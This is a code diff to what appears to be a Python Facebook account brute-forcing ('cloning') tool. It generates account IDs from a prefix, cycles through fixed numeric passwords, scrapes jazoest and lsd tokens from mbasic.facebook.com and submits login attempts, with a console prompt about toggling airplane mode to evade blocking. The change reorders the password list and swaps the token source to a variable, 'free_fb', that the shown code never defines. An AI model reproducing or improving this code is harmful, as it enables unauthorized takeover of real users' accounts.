@@ -161,7 +161,7 @@ def rndm():
                 print(f'\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m\033[1;97m FIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE');linex()
                 for love in user:
                         ids = code + love 
-                        pasx = [ids[:6],ids[:8],ids,'57273200','57575751','59039200','57575752']
+                        pasx = ['57273200',ids[:6],ids[:8],ids,'57575751','59039200','57575752']
                         if sumon in ['1','1']:
                         	_BLACK_.submit(_M1_,ids,pasx)
                         if sumon in ['2','2']:
@@ -286,8 +286,8 @@ def _M2_(ids,pasx):
                         pro = random.choice(ugen)
                         BLACKX = session.get('https://mbasic.facebook.com').text
                         apple = {
-                        'jazoest': re.search('name="jazoest" value="(.*?)"', str(BLACKX)).group(1),
-                        'lsd': re.search('name="lsd" value="(.*?)"', str(BLACKX)).group(1),
+                        'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+                        'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                         'email': ids,
                         'login_source': 'comet_headerless_login',
                         'next': '',
